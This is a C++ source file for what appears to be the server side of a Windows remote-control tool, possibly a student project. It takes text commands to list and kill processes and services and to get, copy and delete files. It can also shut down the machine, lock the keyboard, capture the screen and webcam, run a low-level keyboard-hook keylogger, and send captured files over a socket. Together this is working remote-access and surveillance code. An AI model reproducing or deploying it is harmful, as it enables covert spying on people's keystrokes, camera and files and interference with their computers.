#include "utils.hpp"

stringstream inp, out;
string requestFilePath;
string webcamCapturePath(filesystem::current_path().string() + "\\webcam.png");
string screenCapturePath(filesystem::current_path().string() + "\\screen.png");
string keyloggerCapturePath(filesystem::current_path().string() + "\\keylogger.txt");

ofstream fo;
VideoCapture* cap(nullptr);
HHOOK hKeyloggerHook(nullptr);
HHOOK hKeylockerHook(nullptr);
atomic<bool> keyloggerRunning(false);
atomic<bool> keylockerRunning(false);
bool isShiftDown(false);

unordered_map<int, string> specialKeys = {
    {VK_BACK, "[BACKSPACE]"},
    {VK_TAB, "[TAB]"},
    {VK_RETURN, "[ENTER]"},
    {VK_PAUSE, "[PAUSE]"},
    {VK_CAPITAL, "[CAPS]"},
    {VK_ESCAPE, "[ESC]"},
    {VK_SPACE, "[SPACE]"},
    {VK_PRIOR, "[PGUP]"},
    {VK_NEXT, "[PGDN]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_UP, "[UP]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_DOWN, "[DOWN]"},
    {VK_INSERT, "[INS]"},
    {VK_DELETE, "[DEL]"},
    {VK_LWIN, "[WIN]"},
    {VK_RWIN, "[WIN]"},
    {VK_NUMLOCK, "[NUM]"},
    {VK_SCROLL, "[SCROLL]"},
    {VK_APPS, "[MENU]"},
    {VK_CLEAR, "[CLEAR]"},
    {VK_DIVIDE, "[NUM/]"},
    {VK_SNAPSHOT, "[PRINT_SCREEN]"},
    {VK_VOLUME_MUTE, "[VOLUME_MUTE]"},
    {VK_VOLUME_DOWN, "[VOLUME_DOWN]"},
    {VK_VOLUME_UP, "[VOLUME_UP]"},
    {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT]"},
    {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV]"},
    {VK_MEDIA_STOP, "[MEDIA_STOP]"},
    {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"},
    {0xFF, "[Undefined]"}
};

unordered_map<string, unordered_map<string, function<void()>>> handlers = {
    {
        "list", 
        {
            { 
                "app", listApps 
            },
            { 
                "service", listServices 
            },
            {
                "dir",
                [] {
                    string dirPath;
                    inp.ignore(numeric_limits<streamsize>::max(), '"');
                    getline(inp, dirPath, '"');
                    if (dirPath == "") {
                        throw invalid_argument("Missing argument: dirPath cannot be empty");
                    }
                    listDir(dirPath);
                }
            }
        }
    },
    {
        "start",
        {
            {
                "app", 
                [] {
                    string appName;
                    inp >> appName;
                    if (appName == "") {
                        throw invalid_argument("Missing argument: appName cannot be empty");
                    }
                    startApp(const_cast<wchar_t*>(wstring(appName.begin(), appName.end()).c_str()));
                }
            },
            {
                "service",
                [] {
                    string serviceName;
                    inp >> serviceName;
                    if (serviceName == "") {
                        throw invalid_argument("Missing argument: serviceName cannot be empty");
                    }
                    startServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                }
            },
            {
                "camera", startCamera
            },
            {
                "keylogger", startKeylogger
            }
        }
    },
    {
        "stop",
        {
            {
                "app", 
                [] {
                    unsigned long procID = 0;
                    inp >> procID;
                    if (procID == 0) {
                        throw invalid_argument("Missing argument: procID cannot be empty");
                    }
                    stopApp(procID);
                }
            },
            {
                "service",
                [] {
                    string serviceName;
                    inp >> serviceName;
                    if (serviceName == "") {
                        throw invalid_argument("Missing argument: serviceName cannot be empty");
                    }
                    stopServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                }
            },
            {
                "camera", stopCamera
            },
            {
                "keylogger", stopKeylogger
            }
        }
    },
    {
        "power",
        {
            { "shutdown", shutdownMachine },
            { "restart", restartMachine }
        }
    },
    {
        "file",
        {
            {
                "get",
                [] {
                    inp.ignore(numeric_limits<streamsize>::max(), '"');
                    getline(inp, requestFilePath, '"');
                    if (requestFilePath == "") {
                        throw invalid_argument("Missing argument: filePath cannot be empty");
                    }
                    out << "File was get successfully.\n\nSee more in file " << getFileName(requestFilePath);
                }
            },
            {
                "copy",
                [] {
                    string srcPath, desPath;
                    inp.ignore(numeric_limits<streamsize>::max(), '"');
                    getline(inp, srcPath, '"');
                    inp.ignore(numeric_limits<streamsize>::max(), '"');
                    getline(inp, desPath, '"');
                    if (srcPath == "" || desPath == "") {
                        throw invalid_argument("Missing argument: srcPath or desPath cannot be empty");
                    }
                    copyFile(wstring(srcPath.begin(), srcPath.end()).c_str(), wstring(desPath.begin(), desPath.end()).c_str());
                }
            },
            {
                "delete",
                [] {
                    string filePath;
                    inp.ignore(numeric_limits<streamsize>::max(), '"');
                    getline(inp, filePath, '"');
                    if (filePath == "") {
                        throw invalid_argument("Missing argument: filePath cannot be empty");
                    }
                    deleteFile(wstring(filePath.begin(), filePath.end()).c_str());
                }
            }
        }
    },
    {
        "capture", 
        {
            { "camera", captureCamera },
            { "screen", captureScreen }
        }
    },
    {
        "lock",
        {
            { "keyboard", lockKeyboard }
        }
    },
    {
        "unlock",
        {
            { "keyboard", unlockKeyboard }
        }
    },
    {
        "help",
        {
            { "", getInstruction }
        }
    },
    {
        "exit",
        {
            { 
                "",
                [] {
                    out << "Server stopped!\n";
                }
            }
        }
    }
};

void getInstruction() {
    vector<vector<string>> data = {
        {"list",    "[app|service|dir]",    "[dirPath]"},
        {"start",   "[app|service]",        "[appPath|serviceName]"},
        {"stop",    "[app|service]",        "[processID|serviceName]"},
        {"power",   "[shutdown|restart]"},
        {"file",    "[get|copy|delete]",    "srcPath\t\t[desPath]"},
        {"capture", "[camera|screen]"},
        {"start",   "[camera|keylogger]"},
        {"stop",    "[camera|keylogger]"},
        {"[un]lock", "keyboard"},
        {"help"},
        {"exit"}
    };
    out << "<p>Usages:</p>" << drawTable(data);
}

string drawTable(const vector<vector<string>>& rowData, const vector<string>& headers) {
    string html = R"(<table>
    <style>
        th {
            border-bottom: 1px solid;
        }
        td {
            padding: 0px 10px;
        }
    </style>
    )";
    
    html += "\t<tr>\n";
    for (const string& header : headers) {
        html += "\t\t<th>" + header + "</th>\n";
    }
    html += "\t</tr>\n";

    for (const auto& row : rowData) {
        html += "\t<tr>\n";
        for (const string& data : row) {
            html += "\t\t<td>" + data + "</td>\n";
        }
        html += "\t</tr>\n";
    }

    html += "</table>\n";
    
    return html;
}

string getFileName(const string& filePath) {
    size_t pos1 = filePath.find_last_of('/'), pos2 = filePath.find_last_of('\\');
    size_t pos;
    if (pos1 == string::npos) {
        pos = pos2;
    }
    else if (pos2 == string::npos) {
        pos = pos1;
    }
    else {
        pos = (pos1 > pos2) ? pos1 : pos2;
    }
    return filePath.substr(pos + 1);
}

void listDir(const string& dirPath) {
    string searchPath = dirPath + "\\*";
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFileW(wstring(searchPath.begin(), searchPath.end()).c_str(), &findFileData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        throw runtime_error("Failed to get directory informations");
    }
    
    vector<vector<string>> data;
    do {
        wstring fileName = findFileData.cFileName;
        bool isDir = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
        if (fileName != L"." && fileName != L"..") {
            data.push_back({ string(fileName.begin(), fileName.end()) + (isDir ? "/" : "")});
        }
    }
    while (FindNextFileW(hFind, &findFileData));

    out << drawTable(data);
    
    FindClose(hFind);
}

HWND GetMainWindowHandle(DWORD processId) {
    HWND hwnd = GetTopWindow(0);
    while (hwnd) {
        DWORD windowProcessId;
        GetWindowThreadProcessId(hwnd, &windowProcessId);
        if (windowProcessId == processId && IsWindowVisible(hwnd) && GetWindowTextLengthW(hwnd) > 0) {
            return hwnd;
        }
        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
    }
    return nullptr;
}

void listApps() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) {
        throw runtime_error("Failed to take a snapshot of processes");
    }
    
    PROCESSENTRY32W entry = { sizeof(entry) };
    if (!Process32FirstW(snapshot, &entry)) {
        CloseHandle(snapshot);
        throw runtime_error("Failed to list processes");
    }
    
    vector<string> headers = { "Process ID", "Executable" };
    vector<vector<string>> data;
    do {
        HWND hwnd = GetMainWindowHandle(entry.th32ProcessID);
        if (hwnd) {
            wstring executeFileName(entry.szExeFile);
            data.push_back({ to_string(entry.th32ProcessID), string(executeFileName.begin(), executeFileName.end()) });
            CloseWindow(hwnd);
        }
    } while (Process32NextW(snapshot, &entry));
    out << drawTable(data, headers);

    CloseHandle(snapshot);
}

void startApp(LPWSTR appPath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        throw runtime_error("Failed to start process");
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    out << "Process started successfully.\n";
}

void stopApp(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (!hProcess) {
        throw runtime_error("Failed to open process");
    }
    
    if (!TerminateProcess(hProcess, 0)) {
        CloseHandle(hProcess);
        throw runtime_error("Failed to stop process");
    }

    CloseHandle(hProcess);
    out << "Process stopped successfully.\n";
}

void listServices() {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scmHandle) {
        throw runtime_error("OpenSCManager failed with error: " + to_string(GetLastError()));
    }
    
    DWORD bytesNeeded = 0, servicesCount = 0, resumeHandle = 0;
    EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesCount, &resumeHandle);

    vector<BYTE> buffer(bytesNeeded);
    ENUM_SERVICE_STATUS* serviceStatus = reinterpret_cast<ENUM_SERVICE_STATUS*>(buffer.data());
    if (!EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
        CloseServiceHandle(scmHandle);
        throw runtime_error("EnumServicesStatus failed with error: " + to_string(GetLastError()));
    }

    vector<string> headers = { "Service Name" , "Status" };
    vector<vector<string>> data;
    for (DWORD i = 0; i < servicesCount; i++) {
        wstring serviceName(serviceStatus[i].lpServiceName), displayName(serviceStatus[i].lpDisplayName);
        data.push_back({ 
            string(serviceName.begin(), serviceName.end()), 
            (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") 
        });
    }
    out << drawTable(data, headers);
    
    CloseServiceHandle(scmHandle);
}

void startServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        throw runtime_error("OpenSCManager failed with error: " + to_string(GetLastError()));
    }

    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_START);
    if (!serviceHandle) {
        CloseServiceHandle(scmHandle);
        throw runtime_error("OpenService failed with error: " + to_string(GetLastError()));
    }

    if (!StartServiceW(serviceHandle, 0, nullptr)) {
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        throw runtime_error("StartService failed with error: " + to_string(GetLastError()));
    }
    
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    out << "Service started successfully.\n";
}

void stopServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        throw runtime_error("OpenSCManager failed with error: " + to_string(GetLastError()));
    }

    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_STOP);
    if (!serviceHandle) {
        CloseServiceHandle(scmHandle);
        throw runtime_error("OpenService failed with error: " + to_string(GetLastError()));
    }

    SERVICE_STATUS status;
    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        throw runtime_error("ControlService failed with error: " + to_string(GetLastError()));
    }
    
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    out << "Service stopped successfully.\n";
}

void enableShutdownPrivilege() {
    // Open a handle to the process's access token
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        throw runtime_error("Failed to open process token. Error: " + to_string(GetLastError()));
    }

    // Look up the LUID for the shutdown privilege
    TOKEN_PRIVILEGES tkp;
    if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        CloseHandle(token);
        throw runtime_error("Failed to lookup privilege value. Error: " + to_string(GetLastError()));
    }

    tkp.PrivilegeCount = 1;  // We are enabling one privilege
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token's privileges to enable shutdown privilege
    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, NULL, NULL)) {
        CloseHandle(token);
        throw runtime_error("Failed to adjust token privileges. Error: " + to_string(GetLastError()));
    }

    CloseHandle(token);
}

void shutdownMachine() {
    enableShutdownPrivilege();

    const wchar_t* shutdownMessage = L"System is shutting down for maintenance.";
    DWORD shutdownReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;

    if (!InitiateSystemShutdownExW(NULL, const_cast<wchar_t*>(shutdownMessage), SHUTDOWN_DELAY, TRUE, FALSE, shutdownReason)) {
        throw runtime_error("Failed to initiate shutdown");
    }
    
    out << "Shutdown initiated successfully. This machine will shutdown after " << SHUTDOWN_DELAY << " seconds.\n";
}

void restartMachine() {
    enableShutdownPrivilege();

    const wchar_t* restartMessage = L"System is restarting for maintenance.";
    DWORD restartReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;

    if (!InitiateSystemShutdownExW(NULL, const_cast<wchar_t*>(restartMessage), SHUTDOWN_DELAY, TRUE, TRUE, restartReason)) {
        throw runtime_error("Failed to initiate restart");
    }

    out << "Restart initiated successfully. This machine will restart after " << SHUTDOWN_DELAY << " seconds.\n";
}

void copyFile(LPCWSTR src, LPCWSTR dst) {
    if (!CopyFileW(src, dst, FALSE)) {
        throw runtime_error("Failed to copy file");
    }
    
    out << "File copied successfully.\n";
}

void deleteFile(LPCWSTR filePath) {
    if (!DeleteFileW(filePath)) {
        throw runtime_error("Failed to delete file");
    }

    out << "File deleted successfully.\n";
}

void captureScreen() {
    // Use device-independent pixels (DPI scaling) to get the actual screen resolution
    HDC hdc = GetDC(NULL);
    int screenWidth = GetDeviceCaps(hdc, DESKTOPHORZRES);  // Actual width in pixels
    int screenHeight = GetDeviceCaps(hdc, DESKTOPVERTRES); // Actual height in pixels

    // Create a compatible bitmap for the screen DC
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemoryDC, hBitmap);

    // Copy the screen content to the memory DC
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Convert the HBITMAP to a Mat
    BITMAP bmp;
    GetObjectW(hBitmap, sizeof(BITMAP), &bmp);

    // Prepare the OpenCV Mat structure
    Mat mat(screenHeight, screenWidth, CV_8UC4);  // 4 channels: BGRA format

    // Copy the bitmap data into the OpenCV Mat
    GetBitmapBits(hBitmap, bmp.bmHeight * bmp.bmWidthBytes, mat.data);

    // Clean up
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hdc);
    ReleaseDC(NULL, hScreenDC);

    // Convert BGRA to BGR (OpenCV default color format)
    Mat bgrMat;
    cvtColor(mat, bgrMat, COLOR_BGRA2BGR);

    // Save the captured screen to a file
    if (bgrMat.empty()) {
        throw runtime_error("Failed to capture screen");
    }
    
    if (!imwrite(screenCapturePath, bgrMat)) {
        throw runtime_error("Failed to save the screenshot");
    }
    
    out << "Capture screen successfuly.\n\nSee more in file " << getFileName(screenCapturePath);
}

LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKBDLLHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKBDLLHookStruct->vkCode;

        switch (wParam) {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
            // Handle Shift keys
            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                isShiftDown = true;
                fo << "[CTRL SHIFT] ";
            }
            // Handle Control keys
            else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
                fo << "[CTRL DOWN] ";
            }
            // Handle Alt keys
            else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) {
                fo << "[ALT DOWN] ";
            }
            else {
                // Handle Function keys
                if (vkCode >= VK_F1 && vkCode <= VK_F24) {
                    fo << "[F" << (vkCode - VK_F1 + 1) << "] ";
                    break;
                }

                // Handle other special keys
                auto it = specialKeys.find(vkCode);
                if (it != specialKeys.end()) {
                    fo << it->second << " ";
                    break;
                }

                // Handle regular character keys
                BYTE keyboardState[256];
                if (!GetKeyboardState(keyboardState)) {
                    break;
                }

                // Modify keyboard state to include SHIFT if it's held down
                if (isShiftDown) {
                    keyboardState[VK_SHIFT] |= 0x80;
                }

                wchar_t unicodeChar[4] = { 0 };
                UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC_EX, GetKeyboardLayout(0));

                int result = ToUnicodeEx(
                    vkCode,
                    scanCode,
                    keyboardState,
                    unicodeChar,
                    sizeof(unicodeChar) / sizeof(wchar_t),
                    0,
                    GetKeyboardLayout(0)
                );

                if (result > 0) {
                    char utf8Char[4] = { 0 };
                    WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, utf8Char, sizeof(utf8Char), NULL, NULL);
                    fo << utf8Char << " ";
                }
                else {
                    // If unable to translate, log the virtual key code
                    fo << vkCode << " ";
                }
            }
            break;

        case WM_KEYUP:
        case WM_SYSKEYUP:
            // Handle Shift keys
            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                isShiftDown = false;
                fo << "[CTRL SHIFT] ";
            }
            // Handle Control keys
            else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
                fo << "[CTRL UP] ";
            }
            // Handle Alt keys
            else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) {
                fo << "[ALT UP] ";
            }
            break;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void startKeylogger() {
    if (!hKeyloggerHook) {
        fo.open(keyloggerCapturePath);
        if (!fo.is_open()) {
            throw runtime_error("Failed to start keylogger");
        }
    
        keyloggerRunning = true;
        thread keyloggerThread([]() {
            hKeyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyloggerProc, nullptr, 0);

            MSG msg;
            while (keyloggerRunning) {
                if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessageW(&msg);
                }
                else {
                    this_thread::sleep_for(chrono::milliseconds(10));
                }
            }

            UnhookWindowsHookEx(hKeyloggerHook);
            hKeyloggerHook = nullptr;
        });
        keyloggerThread.detach(); // Detach the thread to run independently
        out << "Keylogger started successfully.\n";
    }
    else {
        out << "Keylogger already started.\n";
    }
}

void stopKeylogger() {
    if (hKeyloggerHook) {
        keyloggerRunning = false;
        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0); // Post a message to wake up the message loop
        fo.close();
        out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
    }
    else {
        out << "Keylogger already stopped.\n";
    }
}

void startCamera() {
    if (!cap) {
        cap = new VideoCapture(0);
        cap->set(CAP_PROP_FRAME_WIDTH, 1280);
        cap->set(CAP_PROP_FRAME_HEIGHT, 720);
    
        if (!cap || !cap->isOpened()) {
            throw runtime_error("Failed to open webcam");
        }
    
        Mat frame;
        *cap >> frame;
        if (!imwrite(webcamCapturePath, frame)) {
            throw runtime_error("Failed to save the capture image");
        }

        out << "Webcam opened successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
    }
    else {
        out << "Webcam already started.\n";
    }
}

void captureCamera() {
    if (!cap || !cap->isOpened()) {
        throw runtime_error("Error: Webcam is not open");
    }
    
    Mat frame;
    *cap >> frame;
    if (!imwrite(webcamCapturePath, frame)) {
        throw runtime_error("Failed to save the capture image");
    }
    out << "Webcam captured successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
}

void stopCamera() {
    if (!cap || !cap->isOpened()) {
        throw runtime_error("Error: Webcam is not open");
    }
        
    Mat frame;
    *cap >> frame;
    if (!imwrite(webcamCapturePath, frame)) {
        throw runtime_error("Failed to save the capture image");
    }
        
    cap->release();
    delete cap;
    cap = nullptr;
    
    out << "Webcam closed successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
}

void sendFile(SOCKET& socket, const string& filePath) {
    // Open the file for reading
    ifstream file(filePath, ios::binary);
    if (!file.is_open()) {
        throw runtime_error("Failed to open file for reading");
    }

    char buffer[BUFFER_SIZE];

    // Read and send the file in chunks
    while (!file.eof()) {
        file.read(buffer, BUFFER_SIZE);
        streamsize bytesRead = file.gcount();
        if (bytesRead > 0) {
            int bytesSent = send(socket, buffer, static_cast<int>(bytesRead), 0);
            if (bytesSent == SOCKET_ERROR) {
                file.close();
                throw runtime_error("Failed to send data over the socket");
            }
        }
    }

    file.close();

    // Clean up
    if (filePath != requestFilePath) {
        if (!DeleteFileA(filePath.c_str())) {
            throw runtime_error("Failed to delete the temporary file");
        }
    }
}

LRESULT CALLBACK KeylockerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        return 1; // Block keyboard input
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void lockKeyboard() {
    if (!hKeylockerHook) {
        keylockerRunning = true;
        thread keylockerThread([]() {
            hKeylockerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeylockerProc, nullptr, 0);

            MSG msg;
            while (keylockerRunning) {
                if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessageW(&msg);
                }
                else {
                    this_thread::sleep_for(chrono::milliseconds(10));
                }
            }

            UnhookWindowsHookEx(hKeylockerHook);
            hKeylockerHook = nullptr;
        });
        keylockerThread.detach(); // Detach the thread to run independently
        out << "Keyboard locked successfully.\n";
    }
    else {
        out << "Keyboard already locked.\n";
    }
}

void unlockKeyboard() {
    if (hKeylockerHook) {
        keylockerRunning = false;
        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0); // Post a message to wake up the message loop
        out << "Keyboard unlocked successfully.\n";
    }
    else {
        out << "Keyboard already unlocked.\n";
    }
}